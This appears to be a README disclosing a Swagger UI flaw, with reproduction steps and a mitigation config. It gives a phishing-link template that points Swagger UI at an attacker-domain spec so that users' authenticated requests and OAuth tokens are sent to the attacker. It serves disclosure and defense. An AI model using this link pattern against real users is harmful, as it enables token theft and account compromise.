# PoC for a Swagger UI XSS vulnerability

## Reproduction

This XSS follows the following scenario:

1. User is sent a phishing link of the following form:

   ```
   https://<legitimate-domain>/?url=https://<attacker-domain>/api-docs.yaml
   ```

   Note that `https://<attacker-domain>/api-docs.yaml` can be an _exact copy_ of `https://<legitimate-domain>/api-docs.yaml`, to spoof it for the user.

2. User authenticates over OAuth, and gets redirected back to `https://<legitimate-domain>/?url=https://<attacker-domain>/api-docs.yaml`.
3. User submits an API request to the server using Swagger UI.
4. Observe in the browser Network tab and in the Curl command that the authenticated request is actually sent to `https://<attacker-domain>`, instead of `https://<legitimate-domain>`. As such, the attacker can capture and exploit a valid user token produced by Google for the legitimate domain.

## Mitigation

Until (and if) this issue is addressed upstream by the Swagger UI team, please add the following parameter to the Swagger UI config:

```js
requestInterceptor: req => {
  req.hostname = window.location.hostname;
  return req;
},
```

As an example, please see how it's implemented in [index.html](index.html).
You can serve this example locally using `node index.js`.
